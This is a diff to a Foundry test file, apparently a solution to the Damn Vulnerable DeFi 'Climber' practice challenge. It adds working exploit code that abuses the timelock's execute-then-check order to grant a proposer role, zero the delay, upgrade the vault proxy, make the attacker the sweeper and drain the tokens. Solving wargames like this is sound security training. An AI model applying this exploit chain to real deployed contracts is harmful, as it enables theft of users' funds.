@@ -8,9 +8,17 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {ClimberVaultV2} from "../../../src/Contracts/climber/ClimberVaultV2.sol";
+import {ClimberExploit} from "../../../src/Contracts/climber/ClimberExploit.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
+
+    // struct Transactions {
+    //     address target;
+    //     uint256 value;
+    //     bytes dataElements;
+    // }
 
     Utilities internal utils;
     DamnValuableToken internal dvt;
@@ -88,6 +96,69 @@ contract Climber is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        ClimberVaultV2 climberImplementationV2 = new ClimberVaultV2();
+        ClimberExploit climberExploit = new ClimberExploit(
+            address(climberTimelock)
+        );
+
+        address[] memory targets = new address[](5);
+        uint256[] memory values = new uint256[](5);
+        bytes[] memory dataElements = new bytes[](5);
+
+        // First transaction will grant ClimberExploit contract proposer role
+
+        targets[0] = address(climberTimelock);
+        dataElements[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            keccak256("PROPOSER_ROLE"),
+            address(climberExploit)
+        );
+
+        // Update delay to zero
+
+        targets[1] = address(climberTimelock);
+        dataElements[1] = abi.encodeWithSignature(
+            "updateDelay(uint64)",
+            0 days
+        );
+
+        // Change implementation . New implementation has a function to change sweeper
+
+        targets[2] = address(climberVaultProxy);
+        dataElements[2] = abi.encodeWithSignature(
+            "upgradeTo(address)",
+            climberImplementationV2
+        );
+
+        // Change sweeper address to attacker address
+
+        targets[3] = address(climberVaultProxy);
+        dataElements[3] = abi.encodeWithSignature(
+            "setSweeper(address)",
+            attacker
+        );
+
+        // Call propose function on climber exploit custom contract
+
+        targets[4] = address(climberExploit);
+        dataElements[4] = abi.encodeWithSignature("propose()");
+
+        climberExploit.setCalldata(
+            targets,
+            dataElements,
+            keccak256("whitehat")
+        );
+
+        climberTimelock.execute(
+            targets,
+            values,
+            dataElements,
+            keccak256("whitehat")
+        );
+
+        vm.prank(attacker);
+        ClimberVault(address(climberVaultProxy)).sweepFunds(address(dvt));
 
         /** EXPLOIT END **/
         validation();
